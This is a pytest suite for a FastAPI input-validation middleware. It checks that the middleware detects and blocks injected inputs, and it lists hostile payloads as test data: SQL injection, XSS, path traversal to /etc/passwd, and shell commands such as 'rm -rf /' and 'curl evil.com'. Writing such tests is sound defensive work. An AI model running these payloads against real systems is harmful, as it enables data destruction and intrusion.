"""
Comprehensive tests for input validation and sanitization middleware.
"""

import pytest
import json
from fastapi import FastAPI, Request, HTTPException
from fastapi.testclient import TestClient
from unittest.mock import Mock, patch

from src.api.middleware.input_validation import (
    InputValidationMiddleware,
    InputSanitizer,
    ValidationConfig,
    SecurityViolation,
    validate_symbol,
    validate_email,
    validate_username,
    validate_api_key
)


class TestInputSanitizer:
    """Test the InputSanitizer class."""
    
    def setup_method(self):
        """Set up test fixtures."""
        self.sanitizer = InputSanitizer()
    
    def test_sanitize_clean_string(self):
        """Test sanitizing a clean string."""
        result = self.sanitizer.sanitize_string("hello world", "test")
        assert result == "hello world"
    
    def test_sanitize_html_entities(self):
        """Test HTML entity escaping."""
        result = self.sanitizer.sanitize_string("<script>alert('xss')</script>", "test")
        # Should not contain raw script tags after sanitization
        assert "<script>" not in result
        assert "alert" not in result or "&lt;" in result
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection."""
        with pytest.raises(SecurityViolation):
            self.sanitizer.sanitize_string("'; DROP TABLE users; --", "test")
        
        with pytest.raises(SecurityViolation):
            self.sanitizer.sanitize_string("admin' OR '1'='1", "test")
        
        with pytest.raises(SecurityViolation):
            self.sanitizer.sanitize_string("1 UNION SELECT * FROM passwords", "test")
    
    def test_xss_detection(self):
        """Test XSS pattern detection."""
        xss_payloads = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "vbscript:msgbox('xss')"
        ]
        
        for payload in xss_payloads:
            with pytest.raises(SecurityViolation, match="Invalid content detected"):
                self.sanitizer.sanitize_string(payload, "test")
    
    def test_path_traversal_detection(self):
        """Test path traversal detection."""
        with pytest.raises(SecurityViolation, match="Invalid path"):
            self.sanitizer.sanitize_string("../../../etc/passwd", "test")
        
        with pytest.raises(SecurityViolation, match="Invalid path"):
            self.sanitizer.sanitize_string("..\\windows\\system32\\cmd.exe", "test")
    
    def test_command_injection_detection(self):
        """Test command injection detection."""
        command_payloads = [
            "test; rm -rf /",
            "test | cat /etc/passwd",
            "test && curl evil.com",
            "test `whoami`",
            "test $(id)"
        ]
        
        for payload in command_payloads:
            with pytest.raises(SecurityViolation, match="Invalid characters"):
                self.sanitizer.sanitize_string(payload, "test")
    
    def test_string_length_limit(self):
        """Test string length limits."""
        config = ValidationConfig(max_string_length=10)
        sanitizer = InputSanitizer(config)
        
        # Short string should pass
        result = sanitizer.sanitize_string("short", "test")
        assert result == "short"
        
        # Long string should raise exception
        with pytest.raises(SecurityViolation, match="String too long"):
            sanitizer.sanitize_string("a" * 11, "test")
    
    def test_sanitize_dict(self):
        """Test dictionary sanitization."""
        data = {
            "clean_key": "clean_value",
            "malicious_key": "<script>alert('xss')</script>",
            "nested": {
                "inner_key": "inner_value"
            }
        }
        
        # Should not raise exception for clean nested structure
        # but will sanitize malicious content
        result = self.sanitizer.sanitize_dict(data)
        assert result["clean_key"] == "clean_value"
        assert "<script>" not in result["malicious_key"]
        assert result["nested"]["inner_key"] == "inner_value"
    
    def test_sanitize_list(self):
        """Test list sanitization."""
        data = [
            "clean_item",
            "<script>alert('xss')</script>",
            {"nested": "value"}
        ]
        
        result = self.sanitizer.sanitize_list(data)
        assert result[0] == "clean_item"
        assert "<script>" not in result[1]
        assert result[2]["nested"] == "value"
    
    def test_deep_nesting_protection(self):
        """Test protection against deep nesting attacks."""
        config = ValidationConfig(max_object_depth=3)
        sanitizer = InputSanitizer(config)
        
        # Create deeply nested object
        data = {"a": {"b": {"c": {"d": "too deep"}}}}
        
        with pytest.raises(SecurityViolation, match="nesting too deep"):
            sanitizer.sanitize_dict(data)
    
    def test_array_length_protection(self):
        """Test protection against large arrays."""
        config = ValidationConfig(max_array_length=5)
        sanitizer = InputSanitizer(config)
        
        # Large array should raise exception
        with pytest.raises(SecurityViolation, match="Array too large"):
            sanitizer.sanitize_list(["item"] * 6)
    
    def test_unicode_stripping(self):
        """Test dangerous Unicode character removal."""
        # Control characters that should be stripped
        malicious_unicode = "test\x00\x01\x08\x7f\x9f"
        result = self.sanitizer.sanitize_string(malicious_unicode, "test")
        
        # Should not contain control characters
        assert "\x00" not in result
        assert "\x01" not in result
        assert "test" in result


class TestValidationHelpers:
    """Test validation helper functions."""
    
    def test_validate_symbol(self):
        """Test symbol validation."""
        # Valid symbols
        assert validate_symbol("AAPL") == "AAPL"
        assert validate_symbol("MSFT") == "MSFT"
        assert validate_symbol("BRK.A") == "BRK.A"
        
        # Invalid symbols
        with pytest.raises(SecurityViolation):
            validate_symbol("<script>alert('xss')</script>")
        
        with pytest.raises(SecurityViolation):
            validate_symbol("'; DROP TABLE stocks; --")
    
    def test_validate_email(self):
        """Test email validation."""
        # Valid emails
        assert validate_email("test@example.com") == "test@example.com"
        assert validate_email("user.name+tag@domain.co.uk") == "user.name+tag@domain.co.uk"
        
        # Invalid emails
        with pytest.raises(SecurityViolation):
            validate_email("invalid-email")
        
        with pytest.raises(SecurityViolation):
            validate_email("<script>@evil.com")
    
    def test_validate_username(self):
        """Test username validation."""
        # Valid usernames
        assert validate_username("user123") == "user123"
        assert validate_username("test_user") == "test_user"
        assert validate_username("user-name") == "user-name"
        
        # Invalid usernames
        with pytest.raises(SecurityViolation):
            validate_username("usr")  # Too short
        
        with pytest.raises(SecurityViolation):
            validate_username("user@name")  # Invalid characters
        
        with pytest.raises(SecurityViolation):
            validate_username("<script>alert('xss')</script>")
    
    def test_validate_api_key(self):
        """Test API key validation."""
        # Valid API key
        valid_key = "a" * 32
        assert validate_api_key(valid_key) == valid_key
        
        # Invalid API keys
        with pytest.raises(SecurityViolation):
            validate_api_key("short")  # Too short
        
        with pytest.raises(SecurityViolation):
            validate_api_key("key with spaces")  # Invalid characters


class TestInputValidationMiddleware:
    """Test the input validation middleware."""
    
    def setup_method(self):
        """Set up test app with middleware."""
        self.app = FastAPI()
        self.middleware = InputValidationMiddleware(self.app)
        
        # Add test endpoints
        @self.app.get("/api/test")
        async def test_endpoint(request: Request):
            return {"message": "success"}
        
        @self.app.post("/api/test")
        async def test_post(request: Request):
            body = await request.body()
            return {"body": body.decode() if body else None}
        
        self.app.add_middleware(InputValidationMiddleware)
        self.client = TestClient(self.app)
    
    def test_public_path_excluded(self):
        """Test that public paths are excluded from validation."""
        response = self.client.get("/docs")
        assert response.status_code == 404  # Endpoint doesn't exist, but validation wasn't applied
    
    def test_api_path_validated(self):
        """Test that API paths are validated."""
        response = self.client.get("/api/test")
        assert response.status_code == 200
    
    def test_malicious_query_param_blocked(self):
        """Test that malicious query parameters are blocked."""
        response = self.client.get("/api/test?param=<script>alert('xss')</script>")
        assert response.status_code == 400
    
    def test_malicious_json_body_blocked(self):
        """Test that malicious JSON bodies are blocked."""
        malicious_json = {
            "field": "<script>alert('xss')</script>",
            "sql": "'; DROP TABLE users; --"
        }
        
        response = self.client.post("/api/test", json=malicious_json)
        assert response.status_code == 400
    
    def test_large_request_blocked(self):
        """Test that large requests are blocked."""
        # This would need to be tested with actual large content
        # For now, just verify the logic exists
        config = ValidationConfig(max_request_size=100)
        middleware = InputValidationMiddleware(self.app, config)
        assert middleware.config.max_request_size == 100
    
    def test_invalid_json_blocked(self):
        """Test that invalid JSON is blocked."""
        response = self.client.post(
            "/api/test",
            content="invalid json{",
            headers={"content-type": "application/json"}
        )
        assert response.status_code == 400
    
    def test_clean_request_passes(self):
        """Test that clean requests pass validation."""
        clean_json = {
            "symbol": "AAPL",
            "amount": 100,
            "type": "buy"
        }
        
        response = self.client.post("/api/test", json=clean_json)
        assert response.status_code == 200


class TestValidationConfig:
    """Test validation configuration."""
    
    def test_default_config(self):
        """Test default configuration values."""
        config = ValidationConfig()
        assert config.max_string_length == 1000
        assert config.max_array_length == 100
        assert config.max_object_depth == 10
        assert len(config.sql_injection_patterns) > 0
        assert len(config.xss_patterns) > 0
    
    def test_custom_config(self):
        """Test custom configuration values."""
        config = ValidationConfig(
            max_string_length=500,
            max_array_length=50,
            sql_injection_patterns=["test_pattern"]
        )
        assert config.max_string_length == 500
        assert config.max_array_length == 50
        assert config.sql_injection_patterns == ["test_pattern"]
    
    def test_config_validation(self):
        """Test configuration validation."""
        # Test valid ranges
        config = ValidationConfig(max_string_length=100)
        assert config.max_string_length == 100
        
        # Invalid values should be caught by Pydantic
        with pytest.raises(ValueError):
            ValidationConfig(max_string_length=0)  # Below minimum


class TestSecurityViolationHandling:
    """Test security violation handling."""
    
    def test_security_violation_exception(self):
        """Test SecurityViolation exception handling."""
        exception = SecurityViolation("Test violation")
        assert str(exception) == "Test violation"
    
    def test_multiple_violations(self):
        """Test handling multiple security violations."""
        sanitizer = InputSanitizer()
        
        # Should catch the first violation it encounters
        with pytest.raises(SecurityViolation):
            sanitizer.sanitize_string("'; DROP TABLE users; <script>alert('xss')</script>", "test")


@pytest.fixture
def sample_malicious_payloads():
    """Sample malicious payloads for testing."""
    return [
        # SQL Injection
        "'; DROP TABLE users; --",
        "admin' OR '1'='1' --",
        "1 UNION SELECT username, password FROM users",
        
        # XSS
        "<script>alert('xss')</script>",
        "javascript:alert('xss')",
        "<img src=x onerror=alert('xss')>",
        
        # Path Traversal
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\cmd.exe",
        
        # Command Injection
        "; rm -rf /",
        "| cat /etc/passwd",
        "&& curl evil.com",
        
        # Unicode attacks
        "test\x00\x01\x7f\x9f",
        
        # HTML injection
        "<iframe src='javascript:alert(1)'></iframe>",
        "<object data='javascript:alert(1)'></object>"
    ]


class TestMaliciousPayloads:
    """Test with various malicious payloads."""
    
    def test_all_payloads_blocked(self, sample_malicious_payloads):
        """Test that all known malicious payloads are blocked."""
        sanitizer = InputSanitizer()
        
        for payload in sample_malicious_payloads:
            with pytest.raises(SecurityViolation, match=r"Invalid|dangerous"):
                sanitizer.sanitize_string(payload, "test")
    
    def test_payloads_in_nested_data(self, sample_malicious_payloads):
        """Test malicious payloads in nested data structures."""
        sanitizer = InputSanitizer()
        
        for payload in sample_malicious_payloads[:5]:  # Test subset for performance
            nested_data = {
                "level1": {
                    "level2": [
                        {"malicious_field": payload}
                    ]
                }
            }
            
            with pytest.raises(SecurityViolation):
                sanitizer.sanitize_dict(nested_data)


class TestPerformance:
    """Test performance characteristics of input validation."""
    
    def test_large_clean_data_performance(self):
        """Test that large clean data is processed efficiently."""
        sanitizer = InputSanitizer()
        
        # Large but clean data should not cause issues
        large_clean_string = "clean data " * 50  # 500 chars
        result = sanitizer.sanitize_string(large_clean_string, "test")
        assert "clean data" in result
    
    def test_deep_clean_nesting_performance(self):
        """Test performance with deeply nested clean data."""
        sanitizer = InputSanitizer()
        
        # Create nested structure within limits
        data = {"level1": {"level2": {"level3": "clean value"}}}
        result = sanitizer.sanitize_dict(data)
        assert result["level1"]["level2"]["level3"] == "clean value"


if __name__ == "__main__":
    pytest.main([__file__])